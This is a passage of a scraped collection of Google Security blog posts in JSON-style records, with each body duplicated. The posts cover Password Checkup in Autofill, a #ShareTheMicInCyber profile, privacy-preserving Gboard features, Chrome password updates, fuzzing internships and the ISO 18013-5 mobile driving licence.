credentials into an app, we’ll check those credentials against a list of known compromised credentials and alert you if your password has been compromised. The prompt can also take you to your Password Manager page, where you can do a comprehensive review of your saved passwords. Password Checkup on Android apps is available on Android 9 and above, for users of Autofill with Google.     Follow the instructions below to enable Autofill with Google on your Android device:    Open your phone’s Settings app  Tap System > Languages & input > Advanced  Tap Autofill service  Tap Google to make sure the setting is enabled    If you can’t find these options, check out this page with details on how to get information from your device manufacturer.   How it works   User privacy is top of mind, especially when it comes to features that handle sensitive data such as passwords. Autofill with Google is built on the Android autofill framework which enforces strict privacy & security invariants that ensure that we have access to the user’s credentials only in the following two cases: 1) the user has already saved said credential to their Google account; 2) the user was offered to save a new credential by the Android OS and chose to save it to their account.    When the user interacts with a credential by either filling it into a form or saving it for the first time, we use the same privacy preserving API that powers the feature in Chrome to check if the credential is part of the list of known compromised passwords tracked by Google.    This implementation ensures that:    Only an encrypted hash of the credential leaves the device (the first 3.25 bytes of the hashed username are sent unencrypted to partition the database)  The server returns a list of encrypted hashes of known breached credentials that share the same prefix  The actual determination of whether the credential has been breached happens locally on the user’s device  The server (Google) does not have access to the unencrypted hash of the user’s password and the client (User) does not have access to the list of unencrypted hashes of potentially breached credentials    For more information on how this API is built under the hood, check out this blog from the Chrome team.   Additional security features   In addition to Password Checkup, Autofill with Google offers other features to help you keep your data secure:    Password generation: With so many credentials to manage, it’s easy for users to recycle the same password across multiple accounts. With password generation, we’ll generate a unique, secure password for you and save it to your Google account so you don’t have to remember it at all. On Android, you can request password generation for an app by long pressing the password field and selecting “Autofill” in the pop-up menu.       Biometric authentication: You can add an extra layer of protection on your device by requiring biometric authentication any time you autofill your credentials or payment information. Biometric authentication can be enabled inside of the Autofill with Google settings.     As always, stay tuned to the Google Security blog to keep up to date on the latest ways we’re improving security across our products.       ", "date": "February 23, 2021"},
{"website": "Google-Security", "title": "\nCelebrating the influence and contributions of Black+ Security & Privacy Googlers\n", "author": [], "link": "https://security.googleblog.com/2021/02/celebrating-influence-and-contributions.html", "abstract": "                            Posted by Royal Hansen, Vice President, Security  Black History Month may be coming to a close, but our work to build sustainable equity for Google&#8217;s Black+ community, and externally is ongoing. Currently, Black Americans make up  less than 12%  of information security analysts in the U.S. In an industry that consistently requires new ideas to spark positive change and stand out against the status quo, it is necessary to have individuals who think, speak, and act in diverse ways. Diverse security teams are more innovative, produce better products and enhance an organization's ability to defend against  cyber threats .  In an effort to amplify the contributions of the Black+ community to security and privacy fields, we&#8217;ll be sharing profiles of Black+ Googlers working on innovative privacy and security solutions over the coming weeks, starting with Camille Stewart, Google&#8217;s Head of Security Policy for Google Play and Android.  Camille co-founded  #ShareTheMicInCyber , an initiative that pairs Black security practitioners with prominent allies, lending their social media platforms to the practitioners for the day. The goal is to break down barriers, engage the security community, and promote sustained action. The #ShareTheMicInCyber campaign will highlight Black women in the security and privacy sector on LinkedIn and Twitter on March 19, 2021 and throughout March 2021 in celebration of Women's History Month. Follow the #ShareTheMicInCyber on March 19th to support and amplify Black women in security and privacy.   Read more about Camille&#8217;s story below&nbsp; &#8595;    #ShareTheMicInCyber: Camille Stewart   Today, we will hear from Camille Stewart, she leads security, privacy, election integrity, and dis/misinformation policy efforts for Google's mobile business. She also spearheads a cross-Google security initiative that sets the strategic vision and objectives for Google&#8217;s engagement on security and privacy issues.   In her (not so) spare time, Camille is co-founder of the  #ShareTheMicInCyber  initiative &#8211; which aims to elevate the profiles, work, and lived experiences of Black cyber practitioners. This initiative has garnered  national  and international attention and has been a force for educating and bringing awareness to the challenges Black security practitioners face in industry. Camille is also a cybersecurity fellow at Harvard University, New America and Truman National Security Project. She sits on the board of the  International Foundation for Electoral Systems  and of  Girl Security , an organization that is working to close the gender gap in national security through learning, training, and mentoring support for girls.        Why do you work in security or privacy?    I work in this space to empower people in and through technology by translating and solving the complex challenges that lie at the intersection of technology, security, society, and the law.    Tell us a little bit about your career journey to Google   Before life at Google, I managed cybersecurity, election security, tech innovation, and risk issues at Deloitte. Prior to that, I was appointed by President Barack Obama to be the Senior Policy Advisor for Cyber Infrastructure &amp; Resilience Policy at the Department of Homeland Security. I was the Senior Manager of Legal Affairs at Cyveillance, a cybersecurity company after working on Capitol Hill.    What is your security or privacy \"soapbox\"?    Right now, I have a few. Users being intentional about their digital security similar to their physical security especially with their mobile devices and apps. As creators of technology, we need to be more intentional about how we educate our users on safety and security. At Google, security is core to everything we do and build, it has to be. We recently launched our Safer With Google campaign which I believe is a great resource for helping users better understand their security and privacy journey.   As an industry, we need to make meaningful national and international progress on digital supply chain transparency and security.    Lastly,  the fact that systemic racism is a cybersecurity threat. I recently  penned a piece  for the Council on Foreign Relations that explores how racism influences cybersecurity and what we must do as an industry to address it.   If you are interested in following Camille&#8217;s work here at Google and beyond, please follow her on Twitter  @CamilleEsq . We will be bringing you more profiles over the coming weeks and we hope you will engage with and share these with your network.&nbsp;    If you are interested in participating or learning more about #ShareTheMicInCyber, click  here .                                    Posted by Royal Hansen, Vice President, SecurityBlack History Month may be coming to a close, but our work to build sustainable equity for Google’s Black+ community, and externally is ongoing. Currently, Black Americans make up less than 12% of information security analysts in the U.S. In an industry that consistently requires new ideas to spark positive change and stand out against the status quo, it is necessary to have individuals who think, speak, and act in diverse ways. Diverse security teams are more innovative, produce better products and enhance an organization's ability to defend against cyber threats.In an effort to amplify the contributions of the Black+ community to security and privacy fields, we’ll be sharing profiles of Black+ Googlers working on innovative privacy and security solutions over the coming weeks, starting with Camille Stewart, Google’s Head of Security Policy for Google Play and Android.Camille co-founded #ShareTheMicInCyber, an initiative that pairs Black security practitioners with prominent allies, lending their social media platforms to the practitioners for the day. The goal is to break down barriers, engage the security community, and promote sustained action. The #ShareTheMicInCyber campaign will highlight Black women in the security and privacy sector on LinkedIn and Twitter on March 19, 2021 and throughout March 2021 in celebration of Women's History Month. Follow the #ShareTheMicInCyber on March 19th to support and amplify Black women in security and privacy. Read more about Camille’s story below ↓#ShareTheMicInCyber: Camille StewartToday, we will hear from Camille Stewart, she leads security, privacy, election integrity, and dis/misinformation policy efforts for Google's mobile business. She also spearheads a cross-Google security initiative that sets the strategic vision and objectives for Google’s engagement on security and privacy issues. In her (not so) spare time, Camille is co-founder of the #ShareTheMicInCyber initiative – which aims to elevate the profiles, work, and lived experiences of Black cyber practitioners. This initiative has garnered national and international attention and has been a force for educating and bringing awareness to the challenges Black security practitioners face in industry. Camille is also a cybersecurity fellow at Harvard University, New America and Truman National Security Project. She sits on the board of the International Foundation for Electoral Systems and of Girl Security, an organization that is working to close the gender gap in national security through learning, training, and mentoring support for girls.Why do you work in security or privacy? I work in this space to empower people in and through technology by translating and solving the complex challenges that lie at the intersection of technology, security, society, and the law. Tell us a little bit about your career journey to GoogleBefore life at Google, I managed cybersecurity, election security, tech innovation, and risk issues at Deloitte. Prior to that, I was appointed by President Barack Obama to be the Senior Policy Advisor for Cyber Infrastructure & Resilience Policy at the Department of Homeland Security. I was the Senior Manager of Legal Affairs at Cyveillance, a cybersecurity company after working on Capitol Hill. What is your security or privacy \"soapbox\"? Right now, I have a few. Users being intentional about their digital security similar to their physical security especially with their mobile devices and apps. As creators of technology, we need to be more intentional about how we educate our users on safety and security. At Google, security is core to everything we do and build, it has to be. We recently launched our Safer With Google campaign which I believe is a great resource for helping users better understand their security and privacy journey. As an industry, we need to make meaningful national and international progress on digital supply chain transparency and security.  Lastly,  the fact that systemic racism is a cybersecurity threat. I recently penned a piece for the Council on Foreign Relations that explores how racism influences cybersecurity and what we must do as an industry to address it. If you are interested in following Camille’s work here at Google and beyond, please follow her on Twitter @CamilleEsq. We will be bringing you more profiles over the coming weeks and we hope you will engage with and share these with your network. If you are interested in participating or learning more about #ShareTheMicInCyber, click here.     ", "date": "February 25, 2021"},
{"website": "Google-Security", "title": "\nPrivacy-Preserving Smart Input with Gboard\n", "author": ["Posted by Yang Lu, Software Engineer, Angana Ghosh, Group Product Manager, and Xu Liu, Director of Engineering, Gboard team\n"], "link": "https://security.googleblog.com/2020/10/privacy-preserving-smart-input-with.html", "abstract": "                             Posted by Yang Lu, Software Engineer, Angana Ghosh, Group Product Manager, and Xu Liu, Director of Engineering, Gboard team     Google Keyboard (a.k.a Gboard) has a critical mission to provide frictionless input on Android to empower users to communicate accurately and express themselves effortlessly. In order to accomplish this mission, Gboard must also protect users' private and sensitive data. Nothing users type is sent to Google servers.  We recently launched privacy-preserving input by further advancing the latest  federated technologies . In Android 11, Gboard also launched the contextual input suggestion experience by integrating on-device smarts into the user's daily communication in a privacy-preserving way.                  Before Android 11, input suggestions were surfaced to users in several different places. In Android 11, Gboard launched a consistent and coordinated approach to access contextual input suggestions. For the first time, we've brought Smart Replies to the keyboard suggestions - powered by system intelligence running entirely on device. The smart input suggestions are rendered with a transparent layer on top of Gboard&#8217;s suggestion strip.  This structure maintains the trust boundaries between the Android platform and Gboard, meaning sensitive personal content cannot be not accessed by Gboard. The suggestions are only sent to the app after the user taps to accept them.     For instance, when a user receives the message &#8220;Have a virtual coffee at 5pm?&#8221; in Whatsapp, on-device system intelligence predicts smart text and emoji replies &#8220;Sounds great!&#8221; and &#8220;👍&#8221;. Android system intelligence can see the incoming message but Gboard cannot. In Android 11, these Smart Replies are rendered by the Android platform on Gboard&#8217;s suggestion strip as a transparent layer. The suggested reply is generated by the system intelligence. When the user taps the suggestion, Android platform sends it to the input field directly. If the user doesn't tap the suggestion, gBoard and the app cannot see it. In this way, Android and Gboard surface the best of Google smarts whilst keeping users' data private: none of their data goes to any app, including the keyboard, unless they've tapped a suggestion.           Additionally,  federated learning  has enabled Gboard to train intelligent input models across many devices while keeping everything individual users type on their device. Today, the emoji is as common as punctuation - and have become the way for our users to express themselves in messaging. Our users want a way to have fresh and diversified emojis to better express their thoughts in messaging apps. Recently, we launched new on-device transformer models that are fine-tuned with federated learning in Gboard, to produce more contextual emoji predictions for English, Spanish and Portuguese.           Furthermore, following the success of privacy-preserving machine learning techniques, Gboard continues to leverage  federated analytics  to understand how Gboard is used from decentralized data. What we've learned from privacy-preserving analysis has let us make better decisions in our product.     When a user shares an emoji in a conversation, their phone keeps an ongoing count of which emojis are used. Later, when the phone is idle, plugged in, and connected to WiFi, Google&#8217;s  federated analytics server  invites the device to join a &#8220;round&#8221; of federated analytics data computation with hundreds of other participating phones. Every device involved in one round will compute the emoji share frequency, encrypt the result and send it a federated analytics server. Although the server can&#8217;t decrypt the data individually, the final tally of total emoji counts can be decrypted when combining encrypted data across devices. The aggregated data shows that the most popular emoji is 😂 in Whatsapp,  😭 in Roblox(gaming), and &#10004; in Google Docs. Emoji 😷 moved up from 119th to 42nd in terms of frequency during COVID-19.     Gboard always has a strong commitment to Google&#8217;s  Privacy Principles . Gboard strives to build privacy-preserving effortless input products for users to freely express their thoughts in 900+ languages while safeguarding user data. We will keep pushing the state of the art in smart  input technologies on Android while safeguarding user data. Stay tuned!                                      Posted by Yang Lu, Software Engineer, Angana Ghosh, Group Product Manager, and Xu Liu, Director of Engineering, Gboard team   Google Keyboard (a.k.a Gboard) has a critical mission to provide frictionless input on Android to empower users to communicate accurately and express themselves effortlessly. In order to accomplish this mission, Gboard must also protect users' private and sensitive data. Nothing users type is sent to Google servers.  We recently launched privacy-preserving input by further advancing the latest federated technologies. In Android 11, Gboard also launched the contextual input suggestion experience by integrating on-device smarts into the user's daily communication in a privacy-preserving way.     Before Android 11, input suggestions were surfaced to users in several different places. In Android 11, Gboard launched a consistent and coordinated approach to access contextual input suggestions. For the first time, we've brought Smart Replies to the keyboard suggestions - powered by system intelligence running entirely on device. The smart input suggestions are rendered with a transparent layer on top of Gboard’s suggestion strip.  This structure maintains the trust boundaries between the Android platform and Gboard, meaning sensitive personal content cannot be not accessed by Gboard. The suggestions are only sent to the app after the user taps to accept them.   For instance, when a user receives the message “Have a virtual coffee at 5pm?” in Whatsapp, on-device system intelligence predicts smart text and emoji replies “Sounds great!” and “👍”. Android system intelligence can see the incoming message but Gboard cannot. In Android 11, these Smart Replies are rendered by the Android platform on Gboard’s suggestion strip as a transparent layer. The suggested reply is generated by the system intelligence. When the user taps the suggestion, Android platform sends it to the input field directly. If the user doesn't tap the suggestion, gBoard and the app cannot see it. In this way, Android and Gboard surface the best of Google smarts whilst keeping users' data private: none of their data goes to any app, including the keyboard, unless they've tapped a suggestion.    Additionally, federated learning has enabled Gboard to train intelligent input models across many devices while keeping everything individual users type on their device. Today, the emoji is as common as punctuation - and have become the way for our users to express themselves in messaging. Our users want a way to have fresh and diversified emojis to better express their thoughts in messaging apps. Recently, we launched new on-device transformer models that are fine-tuned with federated learning in Gboard, to produce more contextual emoji predictions for English, Spanish and Portuguese.    Furthermore, following the success of privacy-preserving machine learning techniques, Gboard continues to leverage federated analytics to understand how Gboard is used from decentralized data. What we've learned from privacy-preserving analysis has let us make better decisions in our product.   When a user shares an emoji in a conversation, their phone keeps an ongoing count of which emojis are used. Later, when the phone is idle, plugged in, and connected to WiFi, Google’s federated analytics server invites the device to join a “round” of federated analytics data computation with hundreds of other participating phones. Every device involved in one round will compute the emoji share frequency, encrypt the result and send it a federated analytics server. Although the server can’t decrypt the data individually, the final tally of total emoji counts can be decrypted when combining encrypted data across devices. The aggregated data shows that the most popular emoji is 😂 in Whatsapp,  😭 in Roblox(gaming), and ✔ in Google Docs. Emoji 😷 moved up from 119th to 42nd in terms of frequency during COVID-19.   Gboard always has a strong commitment to Google’s Privacy Principles. Gboard strives to build privacy-preserving effortless input products for users to freely express their thoughts in 900+ languages while safeguarding user data. We will keep pushing the state of the art in smart  input technologies on Android while safeguarding user data. Stay tuned!      ", "date": "October 7, 2020"},
{"website": "Google-Security", "title": "\nNew Year, new password protections in Chrome\n", "author": ["Posted by Ali Sarraf, Product Manager, Chrome"], "link": "https://security.googleblog.com/2021/01/new-year-new-password-protections-in.html", "abstract": "                             Posted by Ali Sarraf, Product Manager, Chrome    Passwords help protect our online information, which is why it&#8217;s never been more important to keep them safe. But when we&#8217;re juggling dozens (if not hundreds!) of passwords across various websites&#8212;from shopping, to entertainment to personal finance&#8212;it feels like there&#8217;s always a new account to set up or manage. While it&#8217;s definitely a best practice to have a strong, unique password for each account, it can be really difficult to remember them all&#8212;that&#8217;s why we have a password manager in Chrome to back you up.     As you browse the web, on your phone, computer or tablet, Chrome can create, store and fill in your passwords with a single click. We'll warn you if your passwords have been compromised after logging in to sites, and you can always check for yourself in Chrome Settings. As we kick off the New Year, we&#8217;re excited to announce new updates that will give you even greater control over your passwords:      Easily fix weak passwords      We&#8217;ve all had moments where we&#8217;ve rushed to set up a new login, choosing a simple &#8220;name-of-your-pet&#8221; password to get set up quickly. However, weak passwords expose you to security risks and should be avoided. In Chrome 88, you can now complete a simple check to identify any weak passwords and take action easily.            To check your passwords, click on the key icon under your profile image, or type  chrome://settings/passwords in your address bar.       Edit your passwords in one place     Chrome can already prompt you to update your saved passwords when you log in to websites. However, you may want to update multiple usernames and passwords easily, in one convenient place. That&#8217;s why starting in Chrome 88, you can manage all of your passwords even faster and easier in Chrome Settings on desktop and iOS (Chrome&#8217;s Android app will be getting this feature soon, too).   Building on the 2020 improvements    These new updates come on top of many improvements from last year which have all contributed to your online safety and make browsing the web even easier:        Password breaches remain a critical concern online. So we&#8217;re proud to share that  Chrome&#8217;s Safety Check  is used 14 million times every week! As a result of Safety Check and other improvements launched in 2020, we&#8217;ve seen a 37% reduction in compromised credentials stored in Chrome.    Starting last September, iOS users were able to autofilll their saved passwords in  other apps and browsers . Today, Chrome is streamlining 3 million sign-ins across iOS apps every week! We also made password filling more secure for Chrome on iOS users by adding  biometric authentication  (coming soon to Chrome on Android).    We&#8217;re always looking for ways to improve the user experience, so we made the password manager easier to use on Android with features like  Touch-to-fill .       The new features with Chrome 88 will be rolled out over the coming weeks, so take advantage of the new updates to keep your passwords secure. Stay tuned for more great password features throughout 2021.                                     Posted by Ali Sarraf, Product Manager, Chrome  Passwords help protect our online information, which is why it’s never been more important to keep them safe. But when we’re juggling dozens (if not hundreds!) of passwords across various websites—from shopping, to entertainment to personal finance—it feels like there’s always a new account to set up or manage. While it’s definitely a best practice to have a strong, unique password for each account, it can be really difficult to remember them all—that’s why we have a password manager in Chrome to back you up.   As you browse the web, on your phone, computer or tablet, Chrome can create, store and fill in your passwords with a single click. We'll warn you if your passwords have been compromised after logging in to sites, and you can always check for yourself in Chrome Settings. As we kick off the New Year, we’re excited to announce new updates that will give you even greater control over your passwords:   Easily fix weak passwords   We’ve all had moments where we’ve rushed to set up a new login, choosing a simple “name-of-your-pet” password to get set up quickly. However, weak passwords expose you to security risks and should be avoided. In Chrome 88, you can now complete a simple check to identify any weak passwords and take action easily.    To check your passwords, click on the key icon under your profile image, or type  chrome://settings/passwords in your address bar.  Edit your passwords in one place Chrome can already prompt you to update your saved passwords when you log in to websites. However, you may want to update multiple usernames and passwords easily, in one convenient place. That’s why starting in Chrome 88, you can manage all of your passwords even faster and easier in Chrome Settings on desktop and iOS (Chrome’s Android app will be getting this feature soon, too).Building on the 2020 improvements These new updates come on top of many improvements from last year which have all contributed to your online safety and make browsing the web even easier:     Password breaches remain a critical concern online. So we’re proud to share that Chrome’s Safety Check is used 14 million times every week! As a result of Safety Check and other improvements launched in 2020, we’ve seen a 37% reduction in compromised credentials stored in Chrome.  Starting last September, iOS users were able to autofilll their saved passwords in other apps and browsers. Today, Chrome is streamlining 3 million sign-ins across iOS apps every week! We also made password filling more secure for Chrome on iOS users by adding biometric authentication (coming soon to Chrome on Android).  We’re always looking for ways to improve the user experience, so we made the password manager easier to use on Android with features like Touch-to-fill.    The new features with Chrome 88 will be rolled out over the coming weeks, so take advantage of the new updates to keep your passwords secure. Stay tuned for more great password features throughout 2021.      ", "date": "January 19, 2021"},
{"website": "Google-Security", "title": "\nFuzzing internships for Open Source Software\n", "author": ["Posted by Abhishek Arya, Chrome Security team"], "link": "https://security.googleblog.com/2020/10/fuzzing-internships-for-open-source.html", "abstract": "                             Posted by Abhishek Arya, Chrome Security team    Open source software is the foundation of many modern software products. Over the years, developers increasingly have  relied on  reusable open source components for their applications. It is paramount that these open source components are secure and reliable, as weaknesses impact those that build upon it.     Google cares deeply about the security of the open source ecosystem and recently launched the  Open Source Security Foundation  with other industry partners.  Fuzzing  is an automated testing technique to find bugs by feeding unexpected inputs to a target program. At Google, we leverage fuzzing at scale to find tens of thousands of security vulnerabilities and stability bugs. This summer, as part of  Google&#8217;s OSS internship initiative , we hosted 50 interns to improve the state of fuzz testing in the open source ecosystem.     The fuzzing interns worked towards integrating new projects and improving existing ones in  OSS-Fuzz , our continuous fuzzing service for the open source community (which has  350+  projects,  22,700  bugs, 89% fixed). Several widely used open source libraries including but not limited to  nginx ,  postgresql ,  usrsctp , and  openexr , now have continuous fuzzing coverage as a result of these efforts.      Another group of interns focused on improving the security of the  Linux kernel .  syzkaller , a kernel fuzzing tool from Google, has been instrumental in  finding kernel vulnerabilities  in various operating systems. The interns were tasked with improving the fuzzing coverage by adding new descriptions to syzkaller like  ip tunnels ,  io_uring , and  bpf_lsm  for example, refining the  interface description language , and advancing kernel  fault injection capabilities .     Some interns chose to write fuzzers for Android and Chrome, which are open source projects that billions of internet users rely on. For Android, the interns contributed several new fuzzers for uncovered areas - network protocols such as  pppd  and  dns , audio codecs like  monoblend ,  g722 , and  android framework . On the Chrome side, interns improved existing blackbox fuzzers, particularly in the areas: DOM, IPC, media, extensions, and added new  libprotobuf-based fuzzers for Mojo .     Our last set of interns researched quite a few under-explored areas of fuzzing, some of which were  fuzzer benchmarking ,  ML based fuzzing ,  differential fuzzing ,  bazel rules for build simplification  and made useful contributions.     Over the course of the internship, our interns have reported over 150 security vulnerabilities and 750 functional bugs. Given the overall success of these efforts, we plan to continue hosting fuzzing internships every year to help secure the open source ecosystem and teach incoming open source contributors about the importance of fuzzing. For more information on the Google internship program and other student opportunities, check out  careers.google.com/students . We encourage you to apply.                                     Posted by Abhishek Arya, Chrome Security team  Open source software is the foundation of many modern software products. Over the years, developers increasingly have relied on reusable open source components for their applications. It is paramount that these open source components are secure and reliable, as weaknesses impact those that build upon it.   Google cares deeply about the security of the open source ecosystem and recently launched the Open Source Security Foundation with other industry partners. Fuzzing is an automated testing technique to find bugs by feeding unexpected inputs to a target program. At Google, we leverage fuzzing at scale to find tens of thousands of security vulnerabilities and stability bugs. This summer, as part of Google’s OSS internship initiative, we hosted 50 interns to improve the state of fuzz testing in the open source ecosystem.   The fuzzing interns worked towards integrating new projects and improving existing ones in OSS-Fuzz, our continuous fuzzing service for the open source community (which has 350+ projects, 22,700 bugs, 89% fixed). Several widely used open source libraries including but not limited to nginx, postgresql, usrsctp, and openexr, now have continuous fuzzing coverage as a result of these efforts.    Another group of interns focused on improving the security of the Linux kernel. syzkaller, a kernel fuzzing tool from Google, has been instrumental in finding kernel vulnerabilities in various operating systems. The interns were tasked with improving the fuzzing coverage by adding new descriptions to syzkaller like ip tunnels, io_uring, and bpf_lsm for example, refining the interface description language, and advancing kernel fault injection capabilities.   Some interns chose to write fuzzers for Android and Chrome, which are open source projects that billions of internet users rely on. For Android, the interns contributed several new fuzzers for uncovered areas - network protocols such as pppd and dns, audio codecs like monoblend, g722, and android framework. On the Chrome side, interns improved existing blackbox fuzzers, particularly in the areas: DOM, IPC, media, extensions, and added new libprotobuf-based fuzzers for Mojo.   Our last set of interns researched quite a few under-explored areas of fuzzing, some of which were fuzzer benchmarking, ML based fuzzing, differential fuzzing, bazel rules for build simplification and made useful contributions.   Over the course of the internship, our interns have reported over 150 security vulnerabilities and 750 functional bugs. Given the overall success of these efforts, we plan to continue hosting fuzzing internships every year to help secure the open source ecosystem and teach incoming open source contributors about the importance of fuzzing. For more information on the Google internship program and other student opportunities, check out careers.google.com/students. We encourage you to apply.      ", "date": "October 9, 2020"},
{"website": "Google-Security", "title": "\n Privacy-preserving features in the Mobile Driving License\n", "author": ["Posted by David Zeuthen, Shawn Willden and René Mayrhofer, Android Security and Privacy team "], "link": "https://security.googleblog.com/2020/10/privacy-preserving-features-in-mobile.html", "abstract": "                             Posted by David Zeuthen, Shawn Willden and René Mayrhofer, Android Security and Privacy team           In the United States and other countries a  Driver's License  is not only used to convey driving privileges, it is also commonly used to prove identity or personal details.     Presenting a Driving License is simple, right? You hand over the card to the individual wishing to confirm your identity (the so-called &#8220; Relying Party &#8221; or &#8220; Verifier &#8221;); they check the  security features of the plastic card  (hologram, micro-printing, etc.) to ensure it&#8217;s not counterfeit; they check that it&#8217;s really your license, making sure you look like the portrait image printed on the card; and they read the data they&#8217;re interested in, typically your age, legal name, address etc. Finally, the verifier needs to hand back the plastic card.           Most people are so familiar with this process that they don&#8217;t think twice about it, or consider the privacy implications. In the following we&#8217;ll discuss how the new and soon-to-be-released  ISO 18013-5  standard will improve on nearly every aspect of the process, and what it has to do with Android.    Mobile Driving License ISO Standard      The  ISO 18013-5 &#8220;Mobile driving licence (mDL) application&#8221;  standard has been written by a diverse group of people representing driving license issuers (e.g. state governments in the US), relying parties (federal and state governments, including law enforcement), academia, industry (including Google), and many others. This ISO standard allows for construction of Mobile Driving License (mDL) applications which users can carry in their phone and can use instead of the plastic card.     Instead of handing over your plastic card, you open the mDL application on your phone and press a button to share your mDL. The Verifier (aka &#8220;Relying Party&#8221;) has their own device with an mDL reader application and they either scan a QR code shown in your mDL app or do an NFC tap. The QR code (or NFC tap) conveys an ephemeral cryptographic public key and hardware address the mDL reader can connect to.     Once the mDL reader obtains the cryptographic key it creates its own ephemeral keypair and establishes an encrypted and authenticated, secure wireless channel (BLE, Wifi Aware or NFC)). The mDL reader uses this secure channel to request data, such as the portrait image or what kinds of vehicles you're allowed to drive, and can also be used to  ask more abstract questions  such as &#8220;is the holder older than 18?&#8221;     Crucially, the mDL application can ask the user to approve which data to release and may require the user to authenticate with fingerprint or face &#8212; none of which a passive plastic card could ever do.           With this explanation in mind, let&#8217;s see how presenting an mDL application compares with presenting a plastic-card driving license:        Your phone need not be handed to the verifier , unlike your plastic card. The first step, which requires closer contact to the Verifier to scan the QR code or tap the NFC reader, is safe from a data privacy point of view, and does not reveal any identifying information to the verifier. For additional protection, mDL apps will have the option of both requiring user authentication before releasing data and then immediately placing the phone in  lockdown mode , to ensure that if the verifier takes the device they cannot easily get information from it.     All data is cryptographically signed by the Issuing Authority  (for example the DMV who issued the mDL) and the verifier's app automatically validates the authenticity of the data transmitted by the mDL and refuses to display inauthentic data. This is far more secure than holograms and microprinting used in plastic cards where verification requires special training which most (human) verifiers don't receive. With most plastic cards, fake IDs are relatively easy to create, especially in an international context, putting everyone&#8217;s identity at risk.      The amount of data presented by the mDL is minimized  &#8212; only data the user elects to release, either explicitly via prompts or implicitly via e.g. pre-approval and user settings, is released. This minimizes potential data abuse and increases the personal safety of users.  For example, any bartender who checks your mDL for the sole purpose of verifying you&#8217;re old enough to buy a drink needs only a single piece of information which is whether the holder is e.g. older than 21, yes or no. Compared to the plastic card, this is a huge improvement; a plastic card shows  all  your data even if the verifier doesn&#8217;t need it.  Additionally, all of this information is available via a  2D barcode on the back  so if you use your plastic card driving license to buy beer, tobacco, or other restricted items at a store it&#8217;s common in some states for the  cashier to scan   your license . In some cases, this means you may get advertising in the mail but they may sell your identifying information to the highest bidder or, worst case,  leak their whole database .           These are some of the reasons why we think mDL is a big win for end users in terms of privacy.     One commonality between plastic-card driving licences and the mDL is how the relying party verifies that the person presenting the license is the authorized holder. In both cases, the verifier manually compares the appearance of the individual against a portrait photo, either printed on the plastic or transmitted electronically and  research has shown  that it&#8217;s hard for individuals to match strangers to portrait images.     The initial version of ISO 18013-5 won&#8217;t improve on this but the ISO committee working on the standard is already investigating ways to utilize on-device biometrics sensors to perform this match in a secure and privacy-protecting way. The hope is that improved fidelity in the process helps reduce unauthorized use of identity documents.    mDL support in Android      Through facilities such as hardware-based Keystore, Android already offers excellent support for security and privacy-sensitive applications and in fact it&#8217;s already possible to implement the  ISO 18013-5  standard on Android without further platform changes. Many organizations participating in the ISO committee have already implemented 18013-5 Android apps.     That said, with purpose-built support in the operating system it is possible to provide better security and privacy properties. Android 11 includes the  Identity Credential APIs  at the Framework level along with a  Hardware Abstraction Layer interface  which can be implemented by Android OEMs to enable identity credential support in Secure Hardware. Using the Identity Credential API, the  Trusted Computing Base  of mDL applications does not include the application or even Android itself. This will be particularly important for future versions where the verifier must trust the device to identify and authenticate the user, for example through fingerprint or face matching on the holder's own device. It&#8217;s likely such a solution will require  certified  hardware and/or software and certification is not practical if the TCB includes the hundreds of millions of lines of code in Android and the Linux kernel.     One advantage of plastic cards is that they don't require power or network communication to be useful. Putting all your licenses on your phone could seem inconvenient in cases where your device is low on battery, or does not have enough battery life to start. The Android Identity Credential HAL therefore provides support for a mode called  Direct Access , where the license is still available through an NFC tap even when the phone's battery is too low to boot it up. Device makers can implement this mode, but it will require hardware support that will take several years to roll out.     For devices without the Identity Credential HAL, we have an  Android Jetpack  which implements the same API and works on nearly every Android device in the world (API level 24 or later). If the device has hardware-backed Identity Credential support then this Jetpack simply forwards calls to the platform API. Otherwise, an Android Keystore-backed implementation will be used. While the Android Keystore-backed implementation does not provide the same level of security and privacy, it is perfectly adequate for both holders and issuers in cases where all data is issuer-signed. Because of this, the Jetpack is the preferred way to use the Identity Credential APIs. We also made available  sample open-source mDL and mDL Reader applications  using the Identity Credential APIs.    Conclusion      Android now includes APIs for managing and presenting with identity documents in a more secure and privacy-focused way than was previously possible. These can be used to implement ISO 18013-5 mDLs but the APIs are generic enough to be usable for other kinds of electronic documents, from school ID or bonus program club cards to passports.     Additionally, the Android Security and Privacy team actively participates in the ISO committees where these standards are written and also works with civil liberties groups to  ensure it has a positive impact on our end users .                                     Posted by David Zeuthen, Shawn Willden and René Mayrhofer, Android Security and Privacy team    In the United States and other countries a Driver's License is not only used to convey driving privileges, it is also commonly used to prove identity or personal details.   Presenting a Driving License is simple, right? You hand over the card to the individual wishing to confirm your identity (the so-called “Relying Party” or “Verifier”); they check the security features of the plastic card (hologram, micro-printing, etc.) to ensure it’s not counterfeit; they check that it’s really your license, making sure you look like the portrait image printed on the card; and they read the data they’re interested in, typically your age, legal name, address etc. Finally, the verifier needs to hand back the plastic card.       Most people are so familiar with this process that they don’t think twice about it, or consider the privacy implications. In the following we’ll discuss how the new and soon-to-be-released ISO 18013-5 standard will improve on nearly every aspect of the process, and what it has to do with Android.  Mobile Driving License ISO Standard    The ISO 18013-5 “Mobile driving licence (mDL) application” standard has been written by a diverse group of people representing driving license issuers (e.g. state governments in the US), relying parties (federal and state governments, including law enforcement), academia, industry (including Google), and many others. This ISO standard allows for construction of Mobile Driving License (mDL) applications which users can carry in their phone and can use instead of the plastic card.   Instead of handing over your plastic card, you open the mDL application on your phone and press a button to share your mDL. The Verifier (aka “Relying Party”) has their own device with an mDL reader application and they either scan a QR code shown in your mDL app or do an NFC tap. The QR code (or NFC tap) conveys an ephemeral cryptographic public key and hardware address the mDL reader can connect to.   Once the mDL reader obtains the cryptographic key it creates its own ephemeral keypair and establishes an encrypted and authenticated, secure wireless channel (BLE, Wifi Aware or NFC)). The mDL reader uses this secure channel to request data, such as the portrait image or what kinds of vehicles you're allowed to drive, and can also be used to ask more abstract questions such as “is the holder older than 18?”   Crucially, the mDL application can ask the user to approve which data to release and may require the user to authenticate with fingerprint or face — none of which a passive plastic card could ever do.       With this explanation in mind, let’s see how presenting an mDL application compares with presenting a plastic-card driving license:    Your phone need not be handed to the verifier, unlike your plastic card. The first step, which requires closer contact to the Verifier to scan the QR code or tap the NFC reader, is safe from a data privacy point of view, and does not reveal any identifying information to the verifier. For additional protection, mDL apps will have the option of both requiring user authentication before releasing data and then immediately placing the phone in lockdown mode, to ensure that if the verifier takes the device they cannot easily get information from it.  All data is cryptographically signed by the Issuing Authority (for example the DMV who issued the mDL) and the verifier's app 